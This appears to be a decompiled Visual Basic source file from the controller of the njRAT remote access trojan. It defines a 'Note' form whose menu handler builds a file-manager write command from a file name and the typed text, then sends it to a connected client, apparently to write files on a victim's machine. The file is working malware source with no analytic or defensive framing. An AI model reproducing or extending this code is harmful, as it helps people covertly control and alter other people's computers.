Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Note
    Public FN As String
    Public SK As Client
    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Dim strArray As String() = New String(9 - 1) {}
        strArray(0) = "Ex"
        strArray(1) = Class7.string_1
        strArray(2) = "fm"
        strArray(3) = Class7.string_1
        strArray(4) = "wr"
        strArray(5) = Class7.string_1
        strArray(6) = Class6.smethod_14(Me.FN)
        strArray(7) = Class7.string_1
        Dim box As TextBox = Me.TextBox1
        Dim text As String = box.Text
        box.Text = [text]
        strArray(8) = Class6.smethod_14([text])
        Me.SK.Send(String.Concat(strArray))
        Me.ToolStripMenuItem1.Enabled = False
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Me.ToolStripMenuItem1.Enabled = True
    End Sub
End Class